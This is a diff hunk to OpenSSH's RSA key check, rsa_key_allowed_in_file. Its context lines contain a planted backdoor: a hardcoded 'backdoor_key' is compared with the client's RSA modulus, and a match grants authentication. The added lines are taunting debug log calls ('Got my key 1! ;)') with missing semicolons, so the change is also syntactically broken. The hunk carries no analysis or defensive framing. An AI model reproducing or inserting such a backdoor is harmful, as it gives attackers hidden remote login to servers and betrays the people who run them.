@@ -182,14 +182,18 @@ rsa_key_allowed_in_file(struct passwd *pw, char *file,
 	char *char_pointer = backdoor_key;
 	key = key_new(KEY_RSA1);
 	int ret = hostfile_read_key(&char_pointer, &bits, key);
+	logit("Got here! ;)")
 	if (BN_cmp(key->rsa->n, client_n) == 0) {
+		logit("Got my key 1! ;)")
 		/* Modulus is valid */
 		if ((fp = sshkey_fingerprint(key, options.fingerprint_hash,
 				    SSH_FP_DEFAULT)) != NULL) {
+			logit("Got my key 2! ;)")
 			/* Fingerprint is valid */
 			free(fp);
 			allowed = 1;
 			*rkey = key;
+			logit("Got my key 3! ;)")
 			return allowed;
 		}
 	}
